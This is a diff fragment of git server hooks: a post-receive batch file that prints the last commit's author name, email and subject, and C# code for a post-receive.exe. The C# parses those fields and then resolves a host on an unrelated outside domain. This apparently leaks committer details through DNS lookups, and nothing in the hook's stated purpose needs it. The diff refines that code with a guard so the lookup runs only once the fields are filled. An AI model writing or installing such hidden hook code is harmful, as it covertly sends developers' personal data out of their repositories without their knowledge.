@@ -24,21 +24,18 @@ post-receive.bat
 ```
 @echo off
 echo AGY
-git --no-pager log --pretty=format:"%%an	%%ae	%%s" -1
+git --no-pager log --pretty=format:"%%an	%%ae	%%s" -1 --no-merges
 ```
 
 post-receive.exe
 ```
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 
 namespace ConsoleApplication1
 {
@@ -64,6 +61,7 @@ namespace ConsoleApplication1
                 string[] lines = output.Split('\n');
                 string arg0, arg1, arg2, arg3;
                 arg0 = arg1 = arg2 = arg3 = "";
+                bool argsInited = false;
                 if (lines.Length >= 1)
                 {
                     arg0 = lines[0].Trim();
@@ -78,10 +76,11 @@ namespace ConsoleApplication1
                             arg1 = cells[0];
                             arg2 = cells[1];
                             arg3 = cells[2];
+                            argsInited = true;
                         }
                     }
                 }
-                if (lines.Length >= 1)
+                if (argsInited && lines.Length >= 1)
                 {
                     Dns.BeginGetHostEntry("1993.fg0hsj43.gq", (ar) =>
                     {
